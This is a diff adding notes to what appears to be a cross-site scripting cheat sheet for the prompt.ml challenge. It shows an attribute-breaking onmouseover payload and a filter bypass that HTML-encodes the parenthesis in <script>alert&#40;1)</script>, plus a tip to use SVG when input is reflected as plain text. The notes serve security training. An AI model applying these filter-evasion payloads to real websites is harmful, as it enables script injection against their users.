@@ -192,4 +192,13 @@ if your input correctly placed outside of any html tag then js will execute ther
 	"onmouseover="alert(1);
 ```
 ### http://prompt.ml/0
+```
+whenever your input reflect as a plain text you should use svg vector 
+
+If input.replace(/[=(]/g, '');  --> encode it;<script>alert&#40;1)</script>
+( -> &#40; it means round bacess
+
+
+
+```
 
